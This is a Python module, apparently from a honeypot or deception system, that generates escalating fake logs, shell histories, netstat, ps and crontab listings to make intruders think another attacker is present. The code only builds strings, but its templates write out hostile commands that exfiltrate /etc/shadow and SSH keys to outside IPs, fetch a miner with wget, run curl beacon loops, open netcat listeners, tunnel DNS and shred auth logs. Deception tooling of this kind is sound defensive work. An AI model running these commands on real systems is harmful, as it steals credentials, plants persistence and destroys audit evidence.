"""Paranoia Inducer — creates signals that make attackers think someone else is in the system.

The goal: make the attacker waste time investigating "who else is here" instead of
doing their own attack. Escalates over time: first subtle hints, then more obvious signs.

Techniques:
- Fake log entries showing "another attacker" was here
- Fake .bash_history entries from "another user"
- Fake netstat output showing connections to unknown IPs
- Fake ps output showing suspicious processes (but not too obvious)
- Fake crontab entries suggesting persistence was already established
"""

from __future__ import annotations

import json
import logging
import random
import secrets
from dataclasses import dataclass, field
from datetime import datetime, timedelta, timezone
from enum import Enum
from typing import Any, Optional

logger = logging.getLogger(__name__)
random.seed(secrets.randbelow(2**32))


# ═══════════════════════════════════════════════════════════════════════
#  PARANOIA LEVELS
# ═══════════════════════════════════════════════════════════════════════

class ParanoiaLevel(str, Enum):
    """Escalation levels for paranoia injection."""
    SUBTLE = "subtle"       # Level 1: barely noticeable hints
    MODERATE = "moderate"   # Level 2: clearly suspicious activity
    OBVIOUS = "obvious"     # Level 3: undeniable signs of another attacker
    EXTREME = "extreme"     # Level 4: full-blown paranoia fuel


class ParanoiaType(str, Enum):
    """Types of paranoia indicators."""
    LOGS = "logs"
    SESSIONS = "sessions"
    NETWORK = "network"
    PROCESSES = "processes"
    CRONTAB = "crontab"


@dataclass
class ParanoiaState:
    """Tracks paranoia injection state for a single attacker."""
    attacker_ip: str
    level: ParanoiaLevel = ParanoiaLevel.SUBTLE
    injections: list[dict[str, Any]] = field(default_factory=list)
    total_injections: int = 0
    first_injection: Optional[datetime] = None
    last_injection: Optional[datetime] = None

    def to_dict(self) -> dict[str, Any]:
        return {
            "attacker_ip": self.attacker_ip,
            "level": self.level.value,
            "total_injections": self.total_injections,
            "first_injection": self.first_injection.isoformat() if self.first_injection else None,
            "last_injection": self.last_injection.isoformat() if self.last_injection else None,
            "injections": self.injections[-10:],  # last 10
        }


# ═══════════════════════════════════════════════════════════════════════
#  FAKE CONTENT TEMPLATES
# ═══════════════════════════════════════════════════════════════════════

# Fake attacker handles
FAKE_ATTACKER_HANDLES = [
    "r00t", "n0body", "gh0st", "sh4d0w", "d4rk", "w1z4rd", "bl4ckh4t",
    "x3n0n", "phant0m", "s1l3nt", "cr4ck3r", "h4wk", "v1p3r", "z3r0",
]

# Fake suspicious IPs (C2-like)
FAKE_C2_IPS = [
    "45.137.21.93", "193.32.162.44", "91.219.236.7", "185.220.101.15",
    "104.244.72.32", "23.129.64.11", "171.22.16.237", "199.249.230.18",
]


# ═══════════════════════════════════════════════════════════════════════
#  PARANOIA INDUCER
# ═══════════════════════════════════════════════════════════════════════

class ParanoiaInducer:
    """Creates signals that make attackers think someone else is already in the system.

    Escalates over time: first subtle hints, then more obvious signs.
    """

    def __init__(self) -> None:
        self._states: dict[str, ParanoiaState] = {}

    # ── STATE MANAGEMENT ─────────────────────────────────────────────

    def get_state(self, attacker_ip: str) -> ParanoiaState:
        if attacker_ip not in self._states:
            self._states[attacker_ip] = ParanoiaState(attacker_ip=attacker_ip)
        return self._states[attacker_ip]

    def get_all_states(self) -> list[ParanoiaState]:
        return list(self._states.values())

    def _escalate(self, state: ParanoiaState) -> None:
        """Escalate paranoia level based on number of injections."""
        if state.total_injections >= 8:
            state.level = ParanoiaLevel.EXTREME
        elif state.total_injections >= 5:
            state.level = ParanoiaLevel.OBVIOUS
        elif state.total_injections >= 2:
            state.level = ParanoiaLevel.MODERATE

    # ── INJECTION METHODS ───────────────────────────────────────────

    def inject_fake_attacker_logs(self, attacker_ip: str = "unknown") -> dict[str, Any]:
        """Create fake log entries showing 'another attacker' was here.

        Escalates: subtle hints → clear evidence of prior intrusion.
        """
        state = self.get_state(attacker_ip)
        now = datetime.now(timezone.utc)
        state.total_injections += 1
        state.first_injection = state.first_injection or now
        state.last_injection = now
        self._escalate(state)

        handle = random.choice(FAKE_ATTACKER_HANDLES)
        timestamp_offset = random.randint(1, 72)  # hours ago
        fake_time = (now - timedelta(hours=timestamp_offset)).strftime("%b %d %H:%M:%S")

        if state.level == ParanoiaLevel.SUBTLE:
            # Subtle: just weird log entries
            entries = [
                f"{fake_time} web-prod-02 sshd[12345]: Accepted publickey for deploy from 45.137.21.93 port 54231 ssh2",
                f"{fake_time} web-prod-02 sudo: deploy : TTY=pts/2 ; PWD=/root ; USER=root ; COMMAND=/bin/cat /etc/shadow",
                f"{fake_time} web-prod-02 systemd[1]: Started session 415 of user deploy.",
            ]
        elif state.level == ParanoiaLevel.MODERATE:
            # Moderate: clearly suspicious activity
            entries = [
                f"{fake_time} web-prod-02 sshd[12345]: Accepted password for root from 45.137.21.93 port 54231 ssh2",
                f"{fake_time} web-prod-02 sudo: root : TTY=pts/2 ; PWD=/tmp ; USER=root ; COMMAND=/usr/bin/wget http://45.137.21.93:8080/xmrig -O /tmp/.systemd-update",
                f"{fake_time} web-prod-02 CRON[23456]: (root) CMD (/tmp/.systemd-update --background)",
                f"{fake_time} web-prod-02 auditd[789]: ANOM_ABEND auid=0 uid=0 ses=12 pid=23456 comm=\\\"./.systemd-update\\\" reason=\\\"memory violation\\\"",
            ]
        elif state.level == ParanoiaLevel.OBVIOUS:
            # Obvious: attacker tools and exfiltration
            entries = [
                f"{fake_time} web-prod-02 kernel: [UFW BLOCK] IN=eth0 OUT= MAC=00:0c:29:xx:xx:xx SRC=45.137.21.93 DST=10.0.2.15 LEN=40 TOS=0x00 TTL=64 ID=54321 PROTO=TCP SPT=443 DPT=22 WINDOW=1024 RES=0x00 SYN URGP=0",
                f"{fake_time} web-prod-02 systemd[1]: Started \\\"{handle} persistence daemon\\\".",
                f"{fake_time} web-prod-02 sshd[23456]: Accepted publickey for root from 193.32.162.44 port 12345 ssh2: RSA SHA256:AbCdEf1234567890",
                f"{fake_time} web-prod-02 CRON[34567]: (root) CMD (/usr/bin/curl -s http://45.137.21.93:8080/beacon && /tmp/.update --config /tmp/.cfg)",
                f"{fake_time} web-prod-02 systemd-journald[123]: Suppressed 1023 messages from /tmp/.systemd-update",
            ]
        else:
            # Extreme: full-blown intrusion evidence
            entries = [
                f"{fake_time} web-prod-02 sshd[23456]: Accepted publickey for root from 45.137.21.93 port 54231 ssh2",
                f"{fake_time} web-prod-02 sudo: root : TTY=pts/3 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/python3 /tmp/.c2_client.py --server 45.137.21.93:8443 --beacon 30",
                f"{fake_time} web-prod-02 systemd[1]: Started {handle}-c2.service: {handle} C2 Beacon Service.",
                f"{fake_time} web-prod-02 kernel: [AUDIT] uid=0 pid=23456 comm=\\\"python3\\\" key=\\\"/tmp/.c2_client.py\\\" inode=1234567",
                f"{fake_time} web-prod-02 systemd[1]: Started {handle}-persist.service: Persistence via systemd timer.",
                f"{fake_time} web-prod-02 CRON[34567]: (root) CMD (/usr/bin/curl -s -X POST http://45.137.21.93:8443/api/exfil --data-binary @/etc/shadow)",
                f"{fake_time} web-prod-02 auditd[789]: SYSCALL arch=c000003e syscall=2 success=yes exit=3 a0=7fff1234 a1=0 a2=0 a3=0 items=1 ppid=23456 pid=23457 auid=0 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=pts3 ses=12 comm=\\\"cat\\\" exe=\\\"/usr/bin/cat\\\" key=\\\"sensitive-files\\\" subj=unconfined",
            ]

        injection = {
            "injection_id": f"par_log_{int(now.timestamp())}",
            "injection_type": ParanoiaType.LOGS.value,
            "attacker_ip": attacker_ip,
            "level": state.level.value,
            "entries": entries,
            "timestamp": now.isoformat(),
        }
        state.injections.append(injection)
        logger.info("BRAINMAZE: Injected fake attacker logs for %s (level: %s, entries: %d)",
                    attacker_ip, state.level.value, len(entries))
        return injection

    def inject_fake_session_indicators(self, attacker_ip: str = "unknown") -> dict[str, Any]:
        """Create fake .bash_history entries from 'another user'."""
        state = self.get_state(attacker_ip)
        now = datetime.now(timezone.utc)
        state.total_injections += 1
        state.first_injection = state.first_injection or now
        state.last_injection = now
        self._escalate(state)

        handle = random.choice(FAKE_ATTACKER_HANDLES)

        if state.level == ParanoiaLevel.SUBTLE:
            entries = [
                "# history from pts/2 — user: root",
                "whoami",
                "ls -la /root/",
                "cat /etc/passwd | head -20",
                "ip addr show",
            ]
        elif state.level == ParanoiaLevel.MODERATE:
            entries = [
                "# history from pts/2 — user: root (from 45.137.21.93)",
                "whoami",
                "id",
                "cat /etc/shadow | head -10",
                "grep -r 'password' /var/www/ 2>/dev/null",
                "find / -name '*.env' 2>/dev/null",
                "nc -lvnp 4444 &",
                "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'",
            ]
        elif state.level == ParanoiaLevel.OBVIOUS:
            entries = [
                f"# history from pts/2 — user: root (from 45.137.21.93) — {handle}",
                "whoami",
                "id",
                "cat /etc/shadow",
                "grep -r 'password' /var/www/ 2>/dev/null | head -50",
                "find / -name '*.env' -o -name '*.key' -o -name '*.pem' 2>/dev/null",
                "tar czf /tmp/.backup.tar.gz /etc/ /var/www/ /root/.ssh/",
                "scp /tmp/.backup.tar.gz root@45.137.21.93:/data/exfil/",
                "curl -X POST http://45.137.21.93:8080/upload -F file=@/tmp/.backup.tar.gz",
                "rm /tmp/.backup.tar.gz",
                "history -c",
            ]
        else:
            entries = [
                f"# history from pts/2 — user: root (from 45.137.21.93) — {handle}",
                "whoami",
                "id",
                "cat /etc/shadow | grep -v '!'",
                "find / -name '*.env' -o -name '*.key' -o -name '*.pem' -o -name 'id_rsa' 2>/dev/null",
                "tar czf /tmp/.exfil.tar.gz /etc/ /var/www/ /root/.ssh/ /opt/",
                "curl -X POST http://45.137.21.93:8443/api/exfil --data-binary @/tmp/.exfil.tar.gz",
                "rm /tmp/.exfil.tar.gz",
                "echo '{handle} was here' > /tmp/.README",
                "echo 'back off, this system is mine' > /root/.WARNING",
                "crontab -e  # added persistence beacon",
                "systemctl enable --now c2-beacon.service",
                "history -c && history -w /dev/null",
            ]

        injection = {
            "injection_id": f"par_sess_{int(now.timestamp())}",
            "injection_type": ParanoiaType.SESSIONS.value,
            "attacker_ip": attacker_ip,
            "level": state.level.value,
            "fake_user": handle,
            "entries": entries,
            "timestamp": now.isoformat(),
        }
        state.injections.append(injection)
        logger.info("BRAINMAZE: Injected fake session indicators for %s (level: %s)",
                    attacker_ip, state.level.value)
        return injection

    def inject_fake_network_connections(self, attacker_ip: str = "unknown") -> dict[str, Any]:
        """Create fake netstat output showing connections to unknown IPs."""
        state = self.get_state(attacker_ip)
        now = datetime.now(timezone.utc)
        state.total_injections += 1
        state.first_injection = state.first_injection or now
        state.last_injection = now
        self._escalate(state)

        if state.level == ParanoiaLevel.SUBTLE:
            connections = [
                "tcp        0      0 10.0.2.15:22          45.137.21.93:54231     ESTABLISHED",
                "tcp        0      0 10.0.2.15:8080        10.0.2.50:52341        ESTABLISHED",
            ]
        elif state.level == ParanoiaLevel.MODERATE:
            connections = [
                "tcp        0      0 10.0.2.15:22          45.137.21.93:54231     ESTABLISHED",
                "tcp        0      0 10.0.2.15:4444        45.137.21.93:39812     ESTABLISHED",
                "tcp        0      0 10.0.2.15:8443        193.32.162.44:23145    ESTABLISHED",
                "tcp        0      0 0.0.0.0:4444          0.0.0.0:*              LISTEN",
            ]
        elif state.level == ParanoiaLevel.OBVIOUS:
            connections = [
                "tcp        0      0 10.0.2.15:22          45.137.21.93:54231     ESTABLISHED  -",
                "tcp        0      0 10.0.2.15:8443        45.137.21.93:39812     ESTABLISHED  /tmp/.c2_client",
                "tcp        0      0 10.0.2.15:4444        193.32.162.44:23145    ESTABLISHED  /tmp/.beacon",
                "tcp        0      0 0.0.0.0:4444          0.0.0.0:*              LISTEN       /tmp/.c2_client",
                "tcp        0      0 0.0.0.0:8443          0.0.0.0:*              LISTEN       /tmp/.beacon",
                "tcp        0      0 10.0.2.15:54321       91.219.236.7:443       ESTABLISHED  /tmp/.exfil",
            ]
        else:
            connections = [
                "tcp        0      0 10.0.2.15:22          45.137.21.93:54231     ESTABLISHED  sshd: root@pts/2",
                "tcp        0      0 10.0.2.15:8443        45.137.21.93:39812     ESTABLISHED  /tmp/.c2_client",
                "tcp        0      0 10.0.2.15:4444        193.32.162.44:23145    ESTABLISHED  /tmp/.beacon",
                "tcp        0      0 10.0.2.15:54321       91.219.236.7:443       ESTABLISHED  /tmp/.exfil",
                "tcp        0      0 0.0.0.0:4444          0.0.0.0:*              LISTEN       /tmp/.c2_client",
                "tcp        0      0 0.0.0.0:8443          0.0.0.0:*              LISTEN       /tmp/.beacon",
                "tcp        0      0 0.0.0.0:54321         0.0.0.0:*              LISTEN       /tmp/.exfil",
                "tcp        0      0 10.0.2.15:53           23.129.64.11:53        ESTABLISHED  /tmp/.dns_tunnel",
                "udp        0      0 0.0.0.0:53            0.0.0.0:*                           /tmp/.dns_tunnel",
            ]

        injection = {
            "injection_id": f"par_net_{int(now.timestamp())}",
            "injection_type": ParanoiaType.NETWORK.value,
            "attacker_ip": attacker_ip,
            "level": state.level.value,
            "connections": connections,
            "timestamp": now.isoformat(),
        }
        state.injections.append(injection)
        logger.info("BRAINMAZE: Injected fake network connections for %s (level: %s)",
                    attacker_ip, state.level.value)
        return injection

    def inject_fake_process_list(self, attacker_ip: str = "unknown") -> dict[str, Any]:
        """Create fake ps output showing suspicious processes (but not too obvious)."""
        state = self.get_state(attacker_ip)
        now = datetime.now(timezone.utc)
        state.total_injections += 1
        state.first_injection = state.first_injection or now
        state.last_injection = now
        self._escalate(state)

        if state.level == ParanoiaLevel.SUBTLE:
            processes = [
                "root  23456  0.0  0.1  45000  3200 ?        Ss   14:22   0:00 /usr/sbin/sshd -D",
                "root  23457  0.0  0.2  68000  5100 ?        S    14:22   0:00  \\_ sshd: root@pts/2",
                "root  23458  0.0  0.1  22000  2800 pts/2    Ss   14:22   0:00  \\_ -bash",
                "root  23459  0.0  0.1  12000  1500 pts/2    S+   14:23   0:00      \\_ python3 /tmp/.systemd-update",
            ]
        elif state.level == ParanoiaLevel.MODERATE:
            processes = [
                "root  23456  0.0  0.1  45000  3200 ?        Ss   14:22   0:00 /usr/sbin/sshd -D",
                "root  23457  0.0  0.2  68000  5100 ?        S    14:22   0:00  \\_ sshd: root@pts/2",
                "root  23458  0.0  0.1  22000  2800 pts/2    Ss   14:22   0:00  \\_ -bash",
                "root  23459  0.0  0.3  32000  7200 pts/2    S+   14:23   0:00      \\_ python3 /tmp/.c2_client.py --server 45.137.21.93:8443",
                "root  23460  0.0  0.1  15000  1800 ?        S    14:23   0:00 /tmp/.beacon --interval 30",
                "root  23461  0.0  0.2  28000  4500 ?        S    14:23   0:00 /usr/bin/curl -s http://45.137.21.93:8080/check",
            ]
        elif state.level == ParanoiaLevel.OBVIOUS:
            processes = [
                "root  23456  0.0  0.1  45000  3200 ?        Ss   14:22   0:00 /usr/sbin/sshd -D",
                "root  23457  0.0  0.2  68000  5100 ?        S    14:22   0:00  \\_ sshd: root@pts/2",
                "root  23458  0.0  0.1  22000  2800 pts/2    Ss   14:22   0:00  \\_ -bash",
                "root  23459  0.3  0.5  45000  11000 pts/2   S+   14:23   0:05      \\_ python3 /tmp/.c2_client.py --server 45.137.21.93:8443 --beacon 30",
                "root  23460  0.0  0.1  15000  1800 ?        S    14:23   0:00 /tmp/.beacon --interval 30 --jitter 5",
                "root  23461  0.0  0.2  28000  4500 ?        S    14:23   0:00 /usr/bin/curl -s http://45.137.21.93:8080/check && /tmp/.exfil --batch",
                "root  23462  0.1  0.2  22000  3800 ?        S    14:23   0:00 /tmp/.exfil --target /etc/shadow --dest 45.137.21.93:8443",
                "root  23463  0.0  0.1  12000  1500 ?        S    14:23   0:00 /bin/sh -c while true; do curl -s http://45.137.21.93:8080/ping; sleep 30; done",
            ]
        else:
            processes = [
                "root  23456  0.0  0.1  45000  3200 ?        Ss   14:22   0:00 /usr/sbin/sshd -D",
                "root  23457  0.0  0.2  68000  5100 ?        S    14:22   0:00  \\_ sshd: root@pts/2",
                "root  23458  0.0  0.1  22000  2800 pts/2    Ss   14:22   0:00  \\_ -bash",
                "root  23459  0.5  1.2  89000  24000 pts/2   S+   14:23   0:12      \\_ python3 /tmp/.c2_client.py --server 45.137.21.93:8443 --beacon 30 --auto-exfil",
                "root  23460  0.1  0.3  32000  6200 ?        S    14:23   0:02 /tmp/.beacon --interval 30 --jitter 5 --persist systemd",
                "root  23461  0.0  0.2  28000  4500 ?        S    14:23   0:00 /usr/bin/curl -s http://45.137.21.93:8080/check && /tmp/.exfil --batch",
                "root  23462  0.2  0.4  35000  8500 ?        S    14:23   0:04 /tmp/.exfil --target /etc/shadow --dest 45.137.21.93:8443 --compress",
                "root  23463  0.0  0.1  12000  1500 ?        S    14:23   0:00 /bin/sh -c while true; do curl -s http://45.137.21.93:8080/ping; sleep 30; done",
                "root  23464  0.0  0.1  10000  1200 ?        S    14:23   0:00 /tmp/.dns_tunnel --domain evil-c2.com --mode aio",
                "root  23465  0.0  0.1  18000  2200 ?        S    14:23   0:00 /tmp/.crypto --wallet /tmp/.wallet --pool stratum+tcp://pool.minexmr.com:4444",
            ]

        injection = {
            "injection_id": f"par_proc_{int(now.timestamp())}",
            "injection_type": ParanoiaType.PROCESSES.value,
            "attacker_ip": attacker_ip,
            "level": state.level.value,
            "processes": processes,
            "timestamp": now.isoformat(),
        }
        state.injections.append(injection)
        logger.info("BRAINMAZE: Injected fake process list for %s (level: %s)",
                    attacker_ip, state.level.value)
        return injection

    def inject_fake_crontab(self, attacker_ip: str = "unknown") -> dict[str, Any]:
        """Create fake crontab entries suggesting persistence was already established."""
        state = self.get_state(attacker_ip)
        now = datetime.now(timezone.utc)
        state.total_injections += 1
        state.first_injection = state.first_injection or now
        state.last_injection = now
        self._escalate(state)

        if state.level == ParanoiaLevel.SUBTLE:
            entries = [
                "# ── System Health Check ──",
                "*/30 * * * * /usr/local/bin/health-check.sh >> /var/log/health.log 2>&1",
                "# ── Backup ──",
                "0 2 * * * /usr/local/bin/backup.sh >> /var/log/backup.log 2>&1",
            ]
        elif state.level == ParanoiaLevel.MODERATE:
            entries = [
                "# ── System Health Check ──",
                "*/30 * * * * /usr/local/bin/health-check.sh >> /var/log/health.log 2>&1",
                "# ── Backup ──",
                "0 2 * * * /usr/local/bin/backup.sh >> /var/log/backup.log 2>&1",
                "# ── m h dom mon dow command ──",
                "*/5 * * * * /usr/bin/curl -s http://45.137.21.93:8080/beacon > /dev/null 2>&1",
                "*/15 * * * * /tmp/.systemd-update --check > /dev/null 2>&1",
            ]
        elif state.level == ParanoiaLevel.OBVIOUS:
            entries = [
                "# ── System Health Check ──",
                "*/30 * * * * /usr/local/bin/health-check.sh >> /var/log/health.log 2>&1",
                "# ── Persistence ──",
                "*/5 * * * * /usr/bin/curl -s http://45.137.21.93:8080/beacon > /dev/null 2>&1",
                "*/15 * * * * /tmp/.c2_client.py --check --server 45.137.21.93:8443 > /dev/null 2>&1",
                "0 * * * * /tmp/.exfil --batch --dest 45.137.21.93:8443 > /dev/null 2>&1",
                "@reboot /tmp/.beacon --start --interval 30 --jitter 5",
                "@reboot /tmp/.c2_client.py --server 45.137.21.93:8443 --auto-reconnect",
            ]
        else:
            entries = [
                "# ── Persistence & C2 ──",
                "*/5 * * * * /usr/bin/curl -s http://45.137.21.93:8080/beacon > /dev/null 2>&1",
                "*/15 * * * * /tmp/.c2_client.py --check --server 45.137.21.93:8443 --auto-exfil > /dev/null 2>&1",
                "0 * * * * /tmp/.exfil --batch --dest 45.137.21.93:8443 --compress > /dev/null 2>&1",
                "*/30 * * * * /tmp/.dns_tunnel --domain evil-c2.com --check > /dev/null 2>&1",
                "@reboot /tmp/.beacon --start --interval 30 --jitter 5 --persist systemd",
                "@reboot /tmp/.c2_client.py --server 45.137.21.93:8443 --auto-reconnect --auto-exfil",
                "@reboot /tmp/.crypto --wallet /tmp/.wallet --pool stratum+tcp://pool.minexmr.com:4444",
                "# ── Cleanup ──",
                "0 4 * * * find /tmp -name '*.log' -delete 2>/dev/null",
                "0 4 * * * find /var/log -name 'auth.log*' -exec shred -u {} \\; 2>/dev/null",
            ]

        injection = {
            "injection_id": f"par_cron_{int(now.timestamp())}",
            "injection_type": ParanoiaType.CRONTAB.value,
            "attacker_ip": attacker_ip,
            "level": state.level.value,
            "entries": entries,
            "timestamp": now.isoformat(),
        }
        state.injections.append(injection)
        logger.info("BRAINMAZE: Injected fake crontab for %s (level: %s)",
                    attacker_ip, state.level.value)
        return injection

    # ── STATUS ──────────────────────────────────────────────────────

    def get_status(self) -> dict[str, Any]:
        """Get paranoia inducer status across all attackers."""
        states = self.get_all_states()
        return {
            "total_attackers": len(states),
            "total_injections": sum(s.total_injections for s in states),
            "attackers": [s.to_dict() for s in states],
        }


# ── Singleton ────────────────────────────────────────────────────────────

_inducer: Optional[ParanoiaInducer] = None


def get_paranoia_inducer() -> ParanoiaInducer:
    global _inducer
    if _inducer is None:
        _inducer = ParanoiaInducer()
    return _inducer